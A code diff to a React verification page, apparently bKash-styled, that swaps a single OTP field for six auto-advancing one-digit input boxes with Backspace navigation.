@@ -298,14 +298,39 @@ export default function Verify() {
             </div>
             <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                 <label className="block text-xs font-bold text-gray-400 mb-1">ওটিপি কোড</label>
-                <input 
-                    type="number" 
-                    className="w-full outline-none py-3 text-2xl font-black tracking-[1em] text-center placeholder:text-gray-200" 
-                    placeholder="XXXXXX"
-                    value={verifyData.otp}
-                    onChange={(e) => setVerifyData({...verifyData, otp: e.target.value})}
-                    maxLength={6}
-                />
+            <div className="flex justify-between items-center gap-2 max-w-[300px] mx-auto">
+                {[0, 1, 2, 3, 4, 5].map((index) => (
+                    <input 
+                        key={index}
+                        id={`otp-${index}`}
+                        type="tel" 
+                        maxLength={1}
+                        className="w-11 h-11 border-2 border-gray-100 rounded-xl text-center text-xl font-black focus:border-bkash-pink outline-none transition-all"
+                        value={verifyData.otp[index] || ''}
+                        onChange={(e) => {
+                            const val = e.target.value;
+                            if (val && !/^\d$/.test(val)) return;
+                            
+                            const otpArray = verifyData.otp.split('');
+                            otpArray[index] = val;
+                            const newOtp = otpArray.join('');
+                            
+                            if (newOtp.length <= 6) {
+                                setVerifyData({...verifyData, otp: newOtp});
+                                // Auto focus next box
+                                if (val && index < 5) {
+                                    document.getElementById(`otp-${index + 1}`)?.focus();
+                                }
+                            }
+                        }}
+                        onKeyDown={(e) => {
+                            if (e.key === 'Backspace' && !verifyData.otp[index] && index > 0) {
+                                document.getElementById(`otp-${index - 1}`)?.focus();
+                            }
+                        }}
+                    />
+                ))}
+            </div>
             </div>
             <button 
                 disabled={loading}
